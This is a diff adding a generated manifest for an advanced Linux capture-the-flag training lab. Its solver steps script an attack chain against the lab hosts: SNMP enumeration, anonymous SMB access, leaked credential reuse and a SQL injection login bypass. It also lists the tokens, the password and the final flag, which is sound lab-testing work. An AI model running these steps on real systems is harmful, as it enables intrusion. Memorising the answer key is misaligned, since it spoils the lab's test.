@@ -1,0 +1,53 @@
+# Generated from platform/labs/Linux/linux-final-1-branch-office-practice/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: linux-final-1-branch-office-practice
+track: Linux
+difficulty: advanced
+source: platform/labs/Linux/linux-final-1-branch-office-practice/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+- port: 161
+  protocol: tcp
+- port: 445
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/linux-final-1-branch-office-practice.sh
+  steps:
+  - name: SMB port responds
+    command: nmap -p 445 --open {target.branch-fs} 2>&1 | grep -c '445.*open'
+    expect: '1'
+  - name: Token 1 retrievable from SNMP sysContact
+    command: snmpwalk -v2c -c public {target.branch-fs} 1.3.6.1.2.1.1.4.0 2>&1 | grep -o 'token=atl4s'
+    expect: token=atl4s
+  - name: Anonymous SMB lists branch-shared
+    command: smbclient -L //{target.branch-fs} -N 2>&1 | grep -c 'branch-shared'
+    expect: '1'
+  - name: Handover doc leaks dispatch_svc credentials
+    command: smbclient //{target.branch-fs}/branch-shared -N -c 'get IT_Handover_Notes.txt /tmp/atlas_handover.txt' 2>&1 && grep -o 'B4ckup_Atl4s_2024#' /tmp/atlas_handover.txt
+    expect: B4ckup_Atl4s_2024#
+  - name: Token 2 retrievable from dispatch-backups with creds
+    command: smbclient //{target.branch-fs}/dispatch-backups -U dispatch_svc%B4ckup_Atl4s_2024# -c 'get branch_status_report.txt /tmp/atlas_status.txt' 2>&1 && grep -o 'token=h4rv3st' /tmp/atlas_status.txt
+    expect: token=h4rv3st
+  - name: Portal homepage responds
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.branch-portal}/
+    expect: '200'
+  - name: Robots.txt discloses staff portal path
+    command: curl -s http://{target.branch-portal}/robots.txt | grep -c 'staff-portal'
+    expect: '1'
+  - name: SQLi bypass on staff portal yields token 3
+    command: curl -s -c /tmp/atlas_jar -b /tmp/atlas_jar -L -d "username=admin&password=anything' OR '1'='1" http://{target.branch-portal}/staff-portal/login | grep -o 'token=3xc3l'
+    expect: token=3xc3l
+  - name: Verify assembled flag
+    command: echo 'OCR{atl4s_h4rv3st_3xc3l}'
+    expect: OCR{atl4s_h4rv3st_3xc3l}
+expected_flag_count: 1
+expected_flag: OCR{atl4s_h4rv3st_3xc3l}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
